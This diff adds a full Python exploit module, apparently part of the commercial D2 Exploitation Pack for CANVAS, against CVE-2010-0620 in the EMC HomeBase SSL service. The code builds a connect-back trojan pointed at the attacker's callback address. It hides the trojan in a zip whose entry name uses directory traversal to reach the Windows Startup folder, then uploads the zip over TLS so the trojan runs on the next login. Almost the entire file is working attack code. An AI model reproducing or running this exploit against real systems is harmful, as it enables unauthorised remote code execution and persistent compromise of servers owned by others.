@@ -1,0 +1,180 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2010
+#
+
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import *
+from httpclientside import httpclientside
+from libs.canvasos import *
+from libs.tlslite.api import *
+from MOSDEF import pelib 
+
+import select
+import struct
+import zipfile
+import os
+
+
+# GUI info
+NAME = "EMC HomeBase SSL Service Arbitrary File Upload Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Arbitrary file upload vulnerability in EMC HomeBase SSL Service"
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "EMC"
+DOCUMENTATION['Date public'] = "2010.02.23"
+DOCUMENTATION["VersionsAffected"] = "EMC HomeBase Server < 6.2.3 - 6.3.2"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-10-020/"
+DOCUMENTATION["CVE Name"] = "CVE-2010-0620"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0620"
+DOCUMENTATION["Notes"] = ""
+
+VERSION='1.0'
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit(tcpexploit):
+    def __init__(self):
+    	tcpexploit.__init__(self)
+    	self.setInfo(DESCRIPTION)
+    	self.name = NAME       
+    	self.port = 18821
+    	self.version = 0
+    	self.ssl = 1
+    	self.trojanname = "d2.exe"    	 	
+    	self.zipfile = "d2.zip"
+    	self.path = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_homebase/"
+    	self.updir = "..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\"        
+    	self.startup = "Documents and Settings\\\\All Users\\\\Start Menu\\\\Programs\\\\Startup\\\\"    
+    	return
+
+ 
+    def maketrojan(self):   
+    	t_os = canvasos("Windows")
+    	t_os.arch = "X86"
+        
+    	self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os)        
+    	self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojanname))            	
+    	file(self.path + self.trojanname, "wb").write(self.mosdeftrojan)
+    	self.setInfo("%s - done"%(NAME))
+    	ret = len(self.mosdeftrojan) != 0
+
+
+    def neededListenerTypes(self):
+    	from canvasengine import WIN32MOSDEF
+    	return [WIN32MOSDEF]
+
+
+    def read_data(self, s):
+    	buff = ""
+    	running = 1
+    	
+    	while running:
+	    	rd, wr, ex = select.select([s.sock], [], [], 2)        
+	    	if not rd:	    		
+					running = 0    	    		    		
+	    	else:
+	    		buff += s.read(1024)
+	    		
+    	return buff    		    		
+
+				  
+    def run(self):
+    	# Check arguments
+    	self.host = self.target.interface
+    	self.port = int(self.argsDict.get("port", self.port))                    		
+    	self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))                
+    	self.log("Attacking %s:%d"%(self.host, self.port))                
+
+    	# Create trojan file
+    	self.maketrojan()
+    	
+    	# Create zip file    	
+    	longname = ("A" * 130) + ".exe"			                 											 
+    	file = zipfile.ZipFile(self.path + self.zipfile, "w")				
+    	file.write(self.path + self.trojanname, longname, zipfile.ZIP_DEFLATED)    		        
+    	file.close()				
+
+    	# Open zip file and update path of file
+    	f = open(self.path + self.zipfile, "rb")
+    	filedata = f.read()
+    	f.close()
+
+    	total_len = len(self.updir) + len(self.startup)        
+    	
+    	if (total_len > 130):
+    		self.log("Filename too long: %s%s" % (self.updir, self.startup))
+    		return
+        
+    	tmp = self.updir + self.startup
+    	tmp += longname[total_len:]                
+    	filedata = filedata.replace(longname, tmp)
+
+    	# Remove files
+    	os.remove(self.path + self.trojanname)		
+    	os.remove(self.path + self.zipfile)
+			
+			# Send exploit																												  
+    	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    	try:
+    		sock.connect((self.host, self.port))
+    	except:
+    		self.log("Could not connect to port %s:%s" % (self.host, self.port))
+    	s = TLSConnection(sock)
+    	s.handshakeClientUnknown()
+      	      
+    	buff = self.read_data(s)	            
+    	self.log("EMC Homebase Server Response: %s" % buff)
+			                
+    	data = "DATA %s %d\r\n" % (self.zipfile, len(filedata))    	
+    	s.write(data)
+    	buff = self.read_data(s)    	
+    	self.log("EMC Homebase Server Response: %s" % buff)
+    	
+    	s.write(filedata)    	
+    	buff = self.read_data(s)    	  	            		                        
+    	self.log("EMC Homebase Server Response: %s" % buff)
+    	
+    	data = "QUIT\r\n"
+    	s.write(data)
+    	buff = self.read_data(s)    	  	            		                        
+    	self.log("EMC Homebase Server Response: %s" % buff)																								
+    	
+    	s.close()
+                  
+    	return 1
+    	
+        		
+    def usage(self):        
+    	print "Usage: %s -t targethost -l localip -d localport\n" % sys.argv[0]
+    	sys.exit(0) 
+
+
+if __name__ == '__main__':
+	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
